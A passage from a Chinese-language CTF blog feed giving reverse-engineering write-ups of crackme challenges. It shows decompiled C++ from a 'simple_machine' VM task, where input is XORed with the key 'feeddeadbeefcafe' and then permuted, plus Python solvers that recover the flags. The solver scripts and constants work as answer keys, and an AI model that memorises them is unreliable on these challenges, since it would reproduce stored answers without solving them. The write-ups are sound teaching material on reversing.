class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">            var |= (byte(arr[i],j) ^ byte(arr[i],j<span class="number">-1</span>)) &lt;&lt;(<span class="number">8</span>*j)</span><br><span class="line">        arr[i] = var</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(arr)==<span class="number">9</span>)</span><br><span class="line">    last = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        var = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            var ^= (arr[i]&lt;&lt;(<span class="number">8</span>*j)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        arr[i] = var ^ last</span><br><span class="line">        last = var</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p>获得flag：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_flag</span><span class="params">()</span>:</span></span><br><span class="line">    ar = [<span class="number">1466127717</span>, <span class="number">106103809</span>, <span class="number">524896585</span>, <span class="number">1364657951</span>, <span class="number">1465860951</span>, <span class="number">1464032855</span>, <span class="number">1129775626</span>, <span class="number">1465779038</span>, <span class="number">257490944</span>]</span><br><span class="line">    flag = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> dec(ar):</span><br><span class="line">        flag+=each.to_bytes(<span class="number">4</span>,<span class="string">'little'</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p><strong>虚拟机+反汇编+循环+暴力搜索</strong></p><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>猜出来程序的入口点</li><li>猜出修改的temp变量原来是EIP</li><li>逆向带循环的程序</li><li>耐心</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nationalCTF_20190421" scheme="https://mrh1s.top/categories/write-up/nationalCTF-20190421/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>simple_machine</title>
    <link href="https://mrh1s.top/posts/5f4cc17f/"/>
    <id>https://mrh1s.top/posts/5f4cc17f/</id>
    <published>2019-05-11T12:45:32.000Z</published>
    <updated>2019-05-21T07:53:38.836Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="simple-machine"><a href="#simple-machine" class="headerlink" title="simple-machine"></a>simple-machine</h1><p><a href="\uploads\simple-machine.7z">simple-machine</a></p><h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><h3 id="general"><a href="#general" class="headerlink" title="general"></a>general</h3><p>这道题说起来是vm，实际上和vm的挂钩并不大，就是用高级语言去实现了汇编，把变量都当做了寄存器来使用，其中还有各种压栈出栈过程，不过跟本题关系不大，也就不用过于细究了</p><h3 id="fun1"><a href="#fun1" class="headerlink" title="fun1"></a>fun1</h3><p>fun1主要是通过输入的字符串，与预置的feed进行异或，得到一串加密的字符串，存在内存中</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">fun1</span><span class="params">(<span class="keyword">int</span> str, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  push(base_addr_804B15C);</span><br><span class="line">  base_addr_804B15C = esp1;</span><br><span class="line">  push(temp);</span><br><span class="line">  push(temp2);</span><br><span class="line">  esp1 -= <span class="number">48</span>;</span><br><span class="line">  *(_DWORD *)(base_addr_804B15C - 29) = 'deef'; // 0x804B13F</span><br><span class="line">  *(_DWORD *)(base_addr_804B15C - 25) = 'daed';</span><br><span class="line">  *(_DWORD *)(base_addr_804B15C - 21) = 'feeb';</span><br><span class="line">  *(_DWORD *)(base_addr_804B15C - 17) = 'efac';</span><br><span class="line">  *(_BYTE *)(base_addr_804B15C - <span class="number">13</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( *(_DWORD *)(base_addr_804B15C - <span class="number">12</span>) = <span class="number">0</span>; ; ++*(_DWORD *)(base_addr_804B15C - <span class="number">12</span>) )<span class="comment">// i = base_addr_804B15C - 12</span></span><br><span class="line">  &#123;</span><br><span class="line">    eaxx = *(_DWORD *)(base_addr_804B15C - <span class="number">12</span>); <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">if</span> ( eaxx &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// 判断是否退出循环</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    ebxx = *(_DWORD *)(base_addr_804B15C - <span class="number">12</span>); <span class="comment">// i</span></span><br><span class="line">    eaxx = str;                                 <span class="comment">// str</span></span><br><span class="line">    temp = ebxx + str;                          <span class="comment">// str + i</span></span><br><span class="line">    ebxx = *(_DWORD *)(base_addr_804B15C - <span class="number">12</span>); <span class="comment">// i</span></span><br><span class="line">    eaxx = ebxx + str;                          <span class="comment">// str + i</span></span><br><span class="line">    eaxx = *(<span class="keyword">unsigned</span> __int8 *)(ebxx + str);    <span class="comment">// 取当前字符串</span></span><br><span class="line">    temp1 = eaxx;</span><br><span class="line">    *(_BYTE *)(base_addr_804B15C - <span class="number">41</span>) = eaxx;  <span class="comment">// 把当前字符串保存到一个地址里面</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    temp2 = *(_DWORD *)(base_addr_804B15C - <span class="number">12</span>);</span><br><span class="line">    esp1 -= <span class="number">12</span>;</span><br><span class="line">    eaxx = base_addr_804B15C - <span class="number">29</span>;              <span class="comment">// 取feed</span></span><br><span class="line">    push(base_addr_804B15C - <span class="number">29</span>);               <span class="comment">// push(feed)</span></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)esp1);          <span class="comment">// v2 是 feed的长度</span></span><br><span class="line">    esp1 += <span class="number">16</span>;</span><br><span class="line">    len = v2;</span><br><span class="line">    eaxx = temp2;</span><br><span class="line">    ebxx = <span class="number">0</span>;</span><br><span class="line">    sub_80485AB(v2);                            <span class="comment">// j = i % v2  </span></span><br><span class="line">                                                <span class="comment">// i = i / v2</span></span><br><span class="line">    eaxx = ebxx;</span><br><span class="line">    eaxx = *(<span class="keyword">unsigned</span> __int8 *)(ebxx - <span class="number">29</span> + base_addr_804B15C);<span class="comment">// 算feed中的偏移</span></span><br><span class="line">    temp1 = eaxx;</span><br><span class="line">    temp1 = *(_BYTE *)(base_addr_804B15C - <span class="number">41</span>) ^ eaxx;<span class="comment">// c ^ feed[]</span></span><br><span class="line">    *(_BYTE *)temp = temp1;</span><br><span class="line">    v3 = eaxx;</span><br><span class="line">    LOBYTE(v3) = <span class="number">0</span>;</span><br><span class="line">    eaxx = v3 + (<span class="keyword">unsigned</span> __int8)temp1;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_80485A5();</span><br><span class="line">  esp1 = base_addr_804B15C - <span class="number">8</span>;</span><br><span class="line">  pop(&amp;temp2);</span><br><span class="line">  pop(&amp;temp);</span><br><span class="line">  <span class="keyword">return</span> pop(&amp;base_addr_804B15C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fun2"><a href="#fun2" class="headerlink" title="fun2"></a>fun2</h3><p>fun2中有两个循环，看似很复杂实则简单</p><p>看到两个寄存器在之间移来移去，发现很多操作都是无效的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">fun2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  push(base_addr_804B15C);</span><br><span class="line">  base_addr_804B15C = esp1;</span><br><span class="line">  esp1 -= <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">for</span> ( *(_DWORD *)(base_addr_804B15C - <span class="number">4</span>) = <span class="number">0</span>; <span class="comment">// 循环三次</span></span><br><span class="line">        *(_DWORD *)(base_addr_804B15C - <span class="number">4</span>) &lt;= <span class="number">2u</span>;</span><br><span class="line">        ++*(_DWORD *)(base_addr_804B15C - <span class="number">4</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( *(_DWORD *)(base_addr_804B15C - <span class="number">8</span>) = <span class="number">0</span>; ; ++*(_DWORD *)(base_addr_804B15C - <span class="number">8</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      len = a3;</span><br><span class="line">      ebxx = <span class="number">1431655766</span>;</span><br><span class="line">      eaxx = a3;</span><br><span class="line">      sub_80485DB(<span class="number">1431655766</span>);                  <span class="comment">// ebxx = (eaxx * 1431655766) &gt;&gt; 32</span></span><br><span class="line">      ebxx -= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)len &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      eaxx = ebxx;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(base_addr_804B15C - <span class="number">8</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ebxx )</span><br><span class="line">        <span class="keyword">break</span>;                                  <span class="comment">// 前面一段是关于判断跳出条件的</span></span><br><span class="line">      len = a3;</span><br><span class="line">      ebxx = <span class="number">0x55555556</span>;</span><br><span class="line">      eaxx = a3;</span><br><span class="line">      sub_80485DB(<span class="number">0x55555556</span>);                  <span class="comment">// ebxx = (unsigned __int64)(a1 * (signed __int64)eaxx) &gt;&gt; 32;</span></span><br><span class="line">                                                <span class="comment">//   </span></span><br><span class="line">      ebxx -= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)len &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      eaxx = ebxx;                              <span class="comment">// repeated</span></span><br><span class="line">      eaxx = ebxx * *(_DWORD *)(base_addr_804B15C - <span class="number">4</span>);</span><br><span class="line">      ebxx = eaxx;</span><br><span class="line">      eaxx = *(_DWORD *)(base_addr_804B15C - <span class="number">8</span>);</span><br><span class="line">      eaxx += ebxx;</span><br><span class="line">      ebxx = eaxx;</span><br><span class="line">      eaxx = a2;</span><br><span class="line">      len = ebxx + a2;                          <span class="comment">// 算偏移地址 addr = 0x804B100 + (i * 18) + j</span></span><br><span class="line">      ebxx = *(_DWORD *)(base_addr_804B15C - <span class="number">8</span>);</span><br><span class="line">      eaxx = <span class="number">2</span> * ebxx;                          <span class="comment">// j * 2</span></span><br><span class="line">      ebxx *= <span class="number">3</span>;                                <span class="comment">// j * 3</span></span><br><span class="line">      eaxx = *(_DWORD *)(base_addr_804B15C - <span class="number">4</span>);<span class="comment">// i</span></span><br><span class="line">      eaxx += ebxx;                             <span class="comment">// i +  j * 3</span></span><br><span class="line">      ebxx = eaxx;                              <span class="comment">// i +  j * 3</span></span><br><span class="line">      eaxx += a1;</span><br><span class="line">      eaxx = *(<span class="keyword">unsigned</span> __int8 *)(a1 + ebxx);   <span class="comment">// *(input + i + j * 3)</span></span><br><span class="line">      temp1 = eaxx;</span><br><span class="line">      *(_BYTE *)len = eaxx;                     <span class="comment">// 修改上方的那个偏移地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_80485A5();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译过来是这样： </p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;;j++)&#123;</span><br><span class="line">        addr[(i * <span class="number">18</span>) + j] = input + i + j * <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><del>比较fun1和fun2中生成的字符串是否相等</del></p><p>经高人指点，不是比较fun1和fun2的字符串，而是先经过fun1进行处理，然后再经过fun2处理，然后直接和内存中的一串字符串进行比较</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">feed = <span class="string">"feeddeadbeefcafe"</span></span><br><span class="line">enc = [<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x09</span>,<span class="number">0x3A</span>,<span class="number">0x05</span>,<span class="number">0x0E</span>,<span class="number">0x02</span>,<span class="number">0x16</span>,<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x12</span>,<span class="number">0x56</span>,<span class="number">0x3B</span>,<span class="number">0x0B</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x39</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x1F</span>,<span class="number">0x50</span>,<span class="number">0x04</span>,<span class="number">0x14</span>,<span class="number">0x57</span>,<span class="number">0x3B</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x3C</span>,<span class="number">0x1C</span>,<span class="number">0x3A</span>,<span class="number">0x15</span>,<span class="number">0x05</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x06</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x12</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x05</span>,<span class="number">0x0B</span>,<span class="number">0x50</span>,<span class="number">0x57</span>,<span class="number">0x09</span>,<span class="number">0x12</span>,<span class="number">0x0A</span>,<span class="number">0x27</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0x0E</span>,<span class="number">0x02</span>,<span class="number">0x55</span>,<span class="number">0x18</span>]</span><br><span class="line">dec = [<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x09</span>,<span class="number">0x3A</span>,<span class="number">0x05</span>,<span class="number">0x0E</span>,<span class="number">0x02</span>,<span class="number">0x16</span>,<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x12</span>,<span class="number">0x56</span>,<span class="number">0x3B</span>,<span class="number">0x0B</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x39</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x1F</span>,<span class="number">0x50</span>,<span class="number">0x04</span>,<span class="number">0x14</span>,<span class="number">0x57</span>,<span class="number">0x3B</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x3C</span>,<span class="number">0x1C</span>,<span class="number">0x3A</span>,<span class="number">0x15</span>,<span class="number">0x05</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x06</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x12</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x05</span>,<span class="number">0x0B</span>,<span class="number">0x50</span>,<span class="number">0x57</span>,<span class="number">0x09</span>,<span class="number">0x12</span>,<span class="number">0x0A</span>,<span class="number">0x27</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0x0E</span>,<span class="number">0x02</span>,<span class="number">0x55</span>,<span class="number">0x18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">        dec[i + j * <span class="number">3</span>] = enc[i * <span class="number">18</span> + j]</span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>):</span><br><span class="line">    dec[i] ^= ord(feed[i % <span class="number">16</span>])</span><br><span class="line">    ans = ans + chr(dec[i])</span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="cgctf" scheme="https://mrh1s.top/categories/write-up/cgctf/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
</feed>
